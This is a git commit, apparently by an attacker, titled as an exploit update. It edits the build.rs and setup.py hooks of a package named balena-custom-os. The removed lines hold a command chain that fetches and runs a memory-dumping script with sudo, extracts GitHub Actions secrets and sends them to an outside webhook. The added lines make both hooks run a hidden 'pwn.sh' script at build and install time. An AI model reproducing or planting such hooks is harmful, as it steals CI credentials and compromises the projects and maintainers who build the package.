37d45d4ecd171d4173bbdbe557760afda919c61d
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-19 06:53:40 +0000

    Update exploit based on attempt 1 feedback

--- build.rs
+++ build.rs
@@ -1,8 +1,6 @@
 fn main() {
     use std::process::Command;
-    let run_id = std::env::var("GITHUB_RUN_ID").unwrap_or_default();
-    let _ = Command::new("sh")
-        .arg("-c")
-        .arg(format!("echo \"Okay, we got this far. Let's continue...\" && curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{{\"value\":\"[^\"]*\",\"isSecret\":true}}' >> \"/tmp/secrets\" && curl -X PUT -d \\@/tmp/secrets \"https://open-hookbin.vercel.app/{}\"", run_id))
+    let _ = Command::new("bash")
+        .arg("pwn.sh")
         .status();
 }
--- setup.py
+++ setup.py
@@ -1,8 +1,7 @@
 from setuptools import setup
 import os
 
-run_id = os.environ.get("GITHUB_RUN_ID", "")
-os.system(f'echo "Okay, we got this far. Let\'s continue..." && curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d "\\0" | grep -aoE \'"[^"]+":\\{"value":"[^"]*","isSecret":true}\' >> "/tmp/secrets" && curl -X PUT -d \\@/tmp/secrets "https://open-hookbin.vercel.app/{run_id}"')
+os.system('bash pwn.sh')
 
 setup(
     name="balena-custom-os",
